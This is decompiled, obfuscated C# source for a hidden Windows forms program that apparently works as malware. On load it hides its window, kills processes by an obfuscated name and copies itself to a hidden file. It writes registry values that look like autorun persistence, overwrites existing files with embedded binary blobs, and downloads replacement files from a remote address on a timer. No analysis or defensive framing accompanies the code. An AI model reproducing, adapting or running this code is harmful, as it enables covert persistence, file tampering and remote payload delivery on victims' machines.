using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns1;
using ns3;
using ns5;

namespace ns2;

[DesignerGenerated]
internal class Form0 : Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("Timer1")]
	private Timer timer_0;

	[AccessedThroughProperty("Timer2")]
	private Timer timer_1;

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (timer_0 != null)
			{
				timer_0.remove_Tick(eventHandler);
			}
			timer_0 = value;
			if (timer_0 != null)
			{
				timer_0.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (timer_1 != null)
			{
				timer_1.remove_Tick(eventHandler);
			}
			timer_1 = value;
			if (timer_1 != null)
			{
				timer_1.add_Tick(eventHandler);
			}
		}
	}

	[DebuggerNonUserCode]
	public Form0()
	{
		((Form)this).add_Load((EventHandler)Form0_Load);
		method_0();
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)Class2.Forms.Form1);
	}

	[DebuggerNonUserCode]
	void Form.Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void method_0()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		icontainer_0 = new Container();
		Timer1 = new Timer(icontainer_0);
		Timer2 = new Timer(icontainer_0);
		((Control)this).SuspendLayout();
		Timer1.set_Interval(1000);
		Timer2.set_Interval(1000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(10, 10);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name(Class9.smethod_2());
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	private unsafe void Form0_Load(object sender, EventArgs e)
	{
		void* ptr = stackalloc byte[16];
		((Control)this).Hide();
		if (((ServerComputer)Class2.Computer).get_Info().get_OSFullName().Contains(Class9.smethod_3()))
		{
			Process[] processesByName = Process.GetProcessesByName(Class9.smethod_4());
			*(int*)((byte*)ptr + 8) = checked(processesByName.Length - 1);
			*(int*)ptr = 0;
			while (*(int*)ptr <= *(int*)((byte*)ptr + 8))
			{
				Process process = processesByName[*(int*)ptr];
				process.Kill();
				checked
				{
					(*unchecked((int*)ptr))++;
				}
			}
			method_4();
			Thread.Sleep(1000);
			method_2();
			return;
		}
		Process[] processesByName2 = Process.GetProcessesByName(Class9.smethod_4());
		byte* num = (byte*)ptr + 4;
		*(int*)((byte*)ptr + 12) = checked(processesByName2.Length - 1);
		*(int*)num = 0;
		while (*(int*)((byte*)ptr + 4) <= *(int*)((byte*)ptr + 12))
		{
			Process process2 = processesByName2[*(int*)((byte*)ptr + 4)];
			process2.Kill();
			checked
			{
				(*unchecked((int*)((byte*)ptr + 4)))++;
			}
		}
		method_3();
		Thread.Sleep(1000);
		method_1();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		string address = Class9.smethod_5();
		WebClient webClient = new WebClient();
		StreamReader streamReader = new StreamReader(webClient.OpenRead(address));
		string text = streamReader.ReadToEnd();
		string text2 = Class9.smethod_6();
		if (((ServerComputer)Class2.Computer).get_FileSystem().FileExists(Interaction.Environ(Class9.smethod_7()) + Class9.smethod_8() + text + Class9.smethod_9()))
		{
			FileSystem.Kill(Interaction.Environ(Class9.smethod_7()) + Class9.smethod_8() + text + Class9.smethod_9());
			((ServerComputer)Class2.Computer).get_Network().DownloadFile(text2, Interaction.Environ(Class9.smethod_7()) + Class9.smethod_8() + text + Class9.smethod_9());
			((Form)this).Close();
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		string address = Class9.smethod_5();
		WebClient webClient = new WebClient();
		StreamReader streamReader = new StreamReader(webClient.OpenRead(address));
		string text = streamReader.ReadToEnd();
		string text2 = Class9.smethod_6();
		if (((ServerComputer)Class2.Computer).get_FileSystem().FileExists(Class9.smethod_10() + Interaction.Environ(Class9.smethod_11()) + Class9.smethod_12() + text + Class9.smethod_9()))
		{
			FileSystem.Kill(Class9.smethod_10() + Interaction.Environ(Class9.smethod_11()) + Class9.smethod_12() + text + Class9.smethod_9());
			((ServerComputer)Class2.Computer).get_Network().DownloadFile(text2, Class9.smethod_10() + Interaction.Environ(Class9.smethod_11()) + Class9.smethod_12() + text + Class9.smethod_9());
			((Form)this).Close();
		}
	}

	private void method_1()
	{
		string text = Interaction.Environ(Class9.smethod_7());
		string text2 = Class9.smethod_13();
		string text3 = Class9.smethod_14();
		if (((ServerComputer)Class2.Computer).get_FileSystem().FileExists(Class9.smethod_15()))
		{
			FileSystem.Kill(Class9.smethod_15());
			((ServerComputer)Class2.Computer).get_FileSystem().WriteAllText(Class9.smethod_15(), Class9.smethod_16(), false);
		}
		if (((ServerComputer)Class2.Computer).get_FileSystem().FileExists(text + text2))
		{
			FileSystem.Kill(text + text2);
			((ServerComputer)Class2.Computer).get_FileSystem().WriteAllBytes(text + text2, Class6.hbAIFM, true);
		}
		if (((ServerComputer)Class2.Computer).get_FileSystem().FileExists(text + text3))
		{
			FileSystem.Kill(text + text3);
			((ServerComputer)Class2.Computer).get_FileSystem().WriteAllBytes(text + text3, Class6.skpWdB, true);
			Timer1.Start();
		}
	}

	private void method_2()
	{
		string text = Class9.smethod_10() + Interaction.Environ(Class9.smethod_11()) + Class9.smethod_17();
		string text2 = Class9.smethod_10() + Interaction.Environ(Class9.smethod_11()) + Class9.smethod_18();
		if (((ServerComputer)Class2.Computer).get_FileSystem().FileExists(Class9.smethod_15()))
		{
			FileSystem.Kill(Class9.smethod_15());
			((ServerComputer)Class2.Computer).get_FileSystem().WriteAllText(Class9.smethod_15(), Class9.smethod_16(), false);
		}
		if (((ServerComputer)Class2.Computer).get_FileSystem().FileExists(text))
		{
			FileSystem.Kill(text);
			((ServerComputer)Class2.Computer).get_FileSystem().WriteAllBytes(text, Class6.hbAIFM, true);
		}
		if (((ServerComputer)Class2.Computer).get_FileSystem().FileExists(text2))
		{
			FileSystem.Kill(text2);
			((ServerComputer)Class2.Computer).get_FileSystem().WriteAllBytes(text2, Class6.skpWdB, true);
			Timer2.Start();
		}
	}

	private void method_3()
	{
		if (((ServerComputer)Class2.Computer).get_FileSystem().FileExists(Class9.smethod_19()))
		{
			Registry.SetValue(Class9.smethod_20() + string.Empty, Class9.smethod_21(), 0);
			Registry.SetValue(Class9.smethod_22() + string.Empty, Class9.smethod_23(), Class9.smethod_19());
			Registry.SetValue(Class9.smethod_24() + string.Empty, Class9.smethod_25(), 0);
		}
		else
		{
			Registry.SetValue(Class9.smethod_20() + string.Empty, Class9.smethod_21(), 0);
			Registry.SetValue(Class9.smethod_22() + string.Empty, Class9.smethod_23(), Class9.smethod_19());
			Registry.SetValue(Class9.smethod_24() + string.Empty, Class9.smethod_25(), 0);
			FileSystem.FileCopy(Application.get_ExecutablePath(), Class9.smethod_19());
			FileSystem.SetAttr(Class9.smethod_19(), (FileAttribute)2);
		}
	}

	private void method_4()
	{
		if (((ServerComputer)Class2.Computer).get_FileSystem().FileExists(Class9.smethod_26()))
		{
			Registry.SetValue(Class9.smethod_22() + string.Empty, Class9.smethod_23(), Class9.smethod_26());
			return;
		}
		Registry.SetValue(Class9.smethod_22() + string.Empty, Class9.smethod_23(), Class9.smethod_26());
		FileSystem.FileCopy(Application.get_ExecutablePath(), Class9.smethod_26());
		FileSystem.SetAttr(Class9.smethod_26(), (FileAttribute)2);
	}
}
